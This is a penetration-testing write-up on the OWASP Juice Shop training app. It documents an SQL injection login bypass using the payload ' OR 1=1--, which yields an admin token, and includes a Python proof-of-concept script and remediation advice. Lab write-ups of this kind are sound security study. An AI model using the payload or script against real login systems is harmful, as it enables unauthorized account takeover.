# Vulnerability Report: Authentication Bypass via SQL Injection
**Target Application:** OWASP Juice Shop **Vulnerable Endpoint:** `POST /rest/user/login` **Objective:** Unauthorized authentication as the application Administrator. **Severity:** Critical

---
## 1. Executive Summary
The login functionality of the target application is vulnerable to SQL Injection (SQLi). The `email` field in the authentication payload does not sufficiently sanitize user input before passing it to the backend database query. This allows an attacker to manipulate the authentication logic, bypass credential verification, and gain unauthorized access to the application's first registered user account, which defaults to the Administrator.
![Authentication Bypass Login Screen](10_Offensive-Security%20Writeups/OWASP%20Juice%20Shop/SQL%20Injection/Z_Assets/Screenshot_20260319_152438.png)

---
## 2. Technical Breakdown
### 2.1 Initial Observation and Request Interception
The testing process began at the application's primary login interface. Authentication requests were intercepted and proxied using Burp Suite to analyze the data structure.
A baseline authentication attempt with arbitrary credentials (`harryharry@harry.com` / `Harry@2001`) yielded a standard `401 Unauthorized` response.
![401 Unauthorized Response](10_Offensive-Security%20Writeups/OWASP%20Juice%20Shop/SQL%20Injection/Z_Assets/Screenshot_20260319_152458.png)
### 2.2 Vulnerability Identification
To test for improper input validation, a standard SQL injection payload containing a single quote (`'`) was submitted in the `email` field.
The application responded with a verbose `500 Internal Server Error`, exposing a `SQLITE_ERROR`. The error stack trace revealed the underlying backend database query structure: `SELECT * FROM Users WHERE email = 'harryharry@harry.com'' AND      password = ...`
This confirms that user input is directly concatenated into the SQL statement, establishing a clear SQL Injection vector.
![500 Internal Server Error SQLite](10_Offensive-Security%20Writeups/OWASP%20Juice%20Shop/SQL%20Injection/Z_Assets/Screenshot_20260319_152556.png)
### 2.3 Exploitation Phase
With the query structure exposed, the objective was to manipulate the database statement to evaluate to `TRUE` without a valid password. Assuming the Administrator account is the first entry in the `Users` table (a common architectural pattern), the following payload was crafted for the `email` field:
**Payload:** `' OR 1=1--`
- `'` closes the string literal for the email parameter.
- `OR 1=1` forces the `WHERE` clause to evaluate as true for the first returned row.
- `--` comments out the remainder of the SQL query, nullifying the password verification requirement.
The modified payload was transmitted via the `POST /rest/user/login` endpoint. The server returned a `200 OK` response, confirming successful authentication bypass. The response body contained a valid JWT token and confirmed the target user identity as `admin@juice-sh.op`.
![200 OK JWT Response](10_Offensive-Security%20Writeups/OWASP%20Juice%20Shop/SQL%20Injection/Z_Assets/Screenshot_20260319_152933.png)

---
## 3. Automated Proof of Concept (PoC)
The following Python script automates the observed exploit sequence.
### Script Breakdown:
1. **Endpoint Targeting:** Defines the target URL and login endpoint.
2. **Payload Construction:** Builds the JSON dictionary containing the malicious SQLi string in the email parameter.
3. **Execution:** Transmits the POST request and evaluates the response text for administrative indicators.
```python
import requests

TARGET_BASE_URL = "http://localhost:3000"

def execute_sqli_bypass(base_url):
    """Executes authentication bypass via SQL Injection."""
    login_endpoint = f"{base_url}/rest/user/login"
    
    # Payload designed to evaluate to true for the first database record
    # and comment out the password verification logic.
    malicious_payload = {
        "email": "' OR 1=1--",
        "password": ""
    }
    
    # Transmitting the payload to the target endpoint
    response = requests.post(login_endpoint, data=malicious_payload)
    
    # Validating exploit success by checking response body
    if "admin" in response.text:
        print("[+] EXPLOIT SUCCESSFUL: Administrator access obtained.")

if __name__ == "__main__":
    execute_sqli_bypass(TARGET_BASE_URL)
```
---
## 4. Mitigation and Remediation
To neutralize the SQL Injection vulnerability at the `POST /rest/user/login` endpoint, implement the following technical controls:
- **Parameterized Queries (Prepared Statements):** Refactor the authentication logic to exclusively use parameterized queries within the database driver or ORM (Sequelize). This guarantees that user-supplied input in the `email` field is strictly evaluated as a data literal and cannot alter the SQL statement's execution logic.
- **Strict Input Validation:** Enforce robust, server-side validation on the `email` parameter. Reject any input that does not conform to standard email formatting syntax or contains unauthorized SQL meta-characters (e.g., `'`, `--`, `;`).
- **Generic Error Handling:** Disable verbose database error reporting in the production environment. Ensure that backend exceptions return generic HTTP responses (e.g., standard `401 Unauthorized`) to prevent further database schema enumeration by attackers.
---
